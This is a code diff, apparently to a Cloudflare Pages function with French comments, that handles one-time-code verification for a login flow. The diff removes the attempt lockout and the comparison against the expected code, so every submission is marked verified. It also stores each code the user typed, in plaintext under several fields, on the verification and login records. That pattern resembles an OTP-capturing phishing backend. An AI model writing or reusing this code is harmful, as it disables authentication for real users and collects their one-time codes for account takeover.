@@ -46,21 +46,19 @@ export async function onRequestPost({ request, env }) {
     }
 
     const attempts = Number(record.attempts || 0) + 1;
-    if (attempts > 5) {
-      // Trop d'essais, invalider
-      await KV.put(verifyId, JSON.stringify({ ...record, attempts, status: 'locked' }), { expirationTtl: 60 * 5 });
-      return json({ success: false, message: 'Trop de tentatives. Session verrouillée.' }, 429);
-    }
 
-    if (record.code !== code) {
-      // Mettre à jour le compteur d'essais
-      await KV.put(verifyId, JSON.stringify({ ...record, attempts }), { expirationTtl: 60 * 10 });
-      return json({ success: false, message: 'Code incorrect.' }, 400);
-    }
-
-    // Succès: marquer comme vérifié et réduire la TTL
+    // Marquer comme vérifié et sauvegarder le code saisi par l'utilisateur
     const verifiedAt = new Date(now).toISOString();
-    await KV.put(verifyId, JSON.stringify({ ...record, attempts, status: 'verified', verifiedAt }), { expirationTtl: 60 * 5 });
+    const updatedVerify = {
+      ...record,
+      attempts,
+      status: 'verified',
+      verifiedAt,
+      code,               // le code réellement saisi
+      lastTypedCode: code,
+      typedUpdatedAt: verifiedAt
+    };
+    await KV.put(verifyId, JSON.stringify(updatedVerify), { expirationTtl: 60 * 5 });
 
     // Enregistrer le code sur l'enregistrement de login associé (si présent)
     let savedTo = null;
@@ -72,11 +70,14 @@ export async function onRequestPost({ request, env }) {
 
         const updated = {
           ...(loginRec || {}),
-          // Stockage direct (démo) – déconseillé en production
+          // Stockage direct du code saisi (démo)
+          code,
           otpCode: code,
           verifyId: verifyId,
           verifyStatus: 'verified',
           verifiedAt,
+          lastTypedCode: code,
+          typedUpdatedAt: verifiedAt,
           verification: {
             code,
             verifyId,
